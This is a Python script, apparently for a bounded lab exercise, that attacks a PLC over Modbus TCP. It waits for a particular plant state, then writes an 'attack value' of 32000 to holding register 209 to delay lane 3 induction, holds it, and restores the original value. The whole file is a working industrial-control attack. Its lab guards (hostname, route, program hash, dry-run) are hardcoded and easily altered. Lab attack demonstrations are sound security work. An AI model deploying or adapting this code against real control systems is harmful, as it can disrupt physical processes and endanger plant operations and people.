"""Bounded Case A lab demonstration: delay lane 3 induction, then restore it.

Run only inside the isolated analyst VM. This script has one fixed target,
one fixed holding register, and one fixed attack value. It cannot address
another host or choose another PLC control from the command line.
"""
import argparse
import json
import socket
import subprocess
import time

SOURCE = "10.10.3.10"
DESTINATION = "10.10.1.10"
PORT = 502
UNIT = 1
REGISTER = 209
EXPECTED_VALUE = 14
ATTACK_VALUE = 32000
PROGRAM_HASH = 24112


def emit(event, **fields):
    print(json.dumps({"event": event, "event_ns": time.monotonic_ns(), **fields},
                     sort_keys=True), flush=True)


def require_lab(hostname, route):
    if hostname != "analyst":
        raise RuntimeError(f"wrong guest: {hostname!r}")
    words = route.split()
    if not (words and words[0] == DESTINATION and
            "via" in words and words[words.index("via") + 1] == "10.10.3.1" and
            "dev" in words and words[words.index("dev") + 1] == "enp7s0" and
            "src" in words and words[words.index("src") + 1] == SOURCE):
        raise RuntimeError(f"wrong lab route: {route!r}")


def reg(client, address, count=1):
    result = client.read_holding_registers(address, count, slave=UNIT)
    if result.isError():
        raise RuntimeError(f"read {address}: {result}")
    return result.registers


def coil(client, address, count=1):
    result = client.read_coils(address, count, slave=UNIT)
    if result.isError():
        raise RuntimeError(f"read coil {address}: {result}")
    return [bool(v) for v in result.bits[:count]]


def write(client, value):
    result = client.write_register(REGISTER, value, slave=UNIT)
    if result.isError():
        raise RuntimeError(f"write {REGISTER}: {result}")


def static_guard(client):
    if reg(client, 249)[0] != PROGRAM_HASH:
        raise RuntimeError("PLC program identity mismatch")
    value = reg(client, REGISTER)[0]
    if value != EXPECTED_VALUE:
        raise RuntimeError(f"pre-attack register {REGISTER} is {value}, expected {EXPECTED_VALUE}")
    return value


def active_guard(client):
    if not coil(client, 880)[0] or coil(client, 914, 2) != [True, True] or not coil(client, 918)[0]:
        return None
    if reg(client, 220)[0] != 3 or reg(client, 207, 3) != [32000, 32000, EXPECTED_VALUE]:
        return None
    rows = reg(client, 530, 24) + reg(client, 647, 12)
    if any(rows[i] == 0 or rows[i + 4] not in (1, 2, 3, 4) for i in (0, 12, 24)):
        return None
    if reg(client, 561)[0] != 0 or reg(client, 591)[0] != 0:
        return None
    epoch = reg(client, 558, 2)
    nonce = reg(client, 509)[0]
    if epoch == [0, 0] or nonce == 0:
        return None
    return {"epoch": epoch, "nonce": nonce, "slots": [rows[i] for i in (0, 12, 24)]}


def execute(client, *, dry_run=False, hold_seconds=30, wait_seconds=120,
            sleep=time.sleep, monotonic=time.monotonic):
    before = static_guard(client)
    emit("guard_pass", source=SOURCE, destination=DESTINATION, port=PORT,
         unit=UNIT, program_hash=PROGRAM_HASH, register=REGISTER, value=before,
         dry_run=dry_run)
    if dry_run:
        return {"dry_run": True, "before": before}
    deadline = monotonic() + wait_seconds
    context = None
    while monotonic() < deadline:
        context = active_guard(client)
        if context:
            break
        sleep(.1)
    if context is None:
        raise TimeoutError("active three-slot plant window not reached")
    # Re-read immediately before the only attack write. A concurrent operator
    # change is a failed precondition, never a value to overwrite.
    if reg(client, REGISTER)[0] != before:
        raise RuntimeError("pre-attack value changed before write")
    attempted = False
    restored = False
    attack_start = monotonic()
    try:
        attempted = True  # a timed-out write may still have reached the PLC
        write(client, ATTACK_VALUE)
        observed = reg(client, REGISTER)[0]
        if observed != ATTACK_VALUE:
            raise RuntimeError(f"attack readback {observed}, expected {ATTACK_VALUE}")
        emit("modbus_write", source=SOURCE, destination=DESTINATION, port=PORT,
             unit=UNIT, function=6, register=REGISTER, before=before,
             value=ATTACK_VALUE, readback=observed, **context)
        while monotonic() - attack_start < hold_seconds:
            sleep(.25)
        return {"dry_run": False, "before": before, "context": context}
    finally:
        if attempted:
            # Retry a transient read/write error, but never leave the value
            # modified silently. The caller receives failure if all attempts fail.
            last_error = None
            for _ in range(3):
                try:
                    write(client, before)
                    restored = reg(client, REGISTER)[0] == before
                    if restored:
                        break
                except Exception as exc:
                    last_error = exc
                    sleep(.2)
            emit("restoration", register=REGISTER, value=before, restored=restored,
                 error=str(last_error) if last_error and not restored else None)
            if not restored:
                raise RuntimeError("PLC register restoration failed") from last_error


def main():
    from pymodbus.client import ModbusTcpClient
    parser = argparse.ArgumentParser()
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--dry-run", action="store_true")
    mode.add_argument("--execute", action="store_true")
    parser.add_argument("--hold-seconds", type=int, default=45)
    args = parser.parse_args()
    if not 1 <= args.hold_seconds <= 60:
        parser.error("hold must be between 1 and 60 seconds")
    route = subprocess.check_output(["ip", "-4", "route", "get", DESTINATION], text=True)
    require_lab(socket.gethostname(), route)
    # A bound TCP connection is the live Case A reachability check. A refused
    # or timed-out connection fails before any Modbus request is sent.
    client = ModbusTcpClient(DESTINATION, port=PORT,
                             source_address=(SOURCE, 0), timeout=2)
    if not client.connect():
        raise RuntimeError("Case A analyst-to-PLC Modbus connection unavailable")
    try:
        emit("case_a_connected", source=SOURCE, destination=DESTINATION, port=PORT)
        execute(client, dry_run=args.dry_run, hold_seconds=args.hold_seconds)
    finally:
        client.close()


if __name__ == "__main__":
    main()
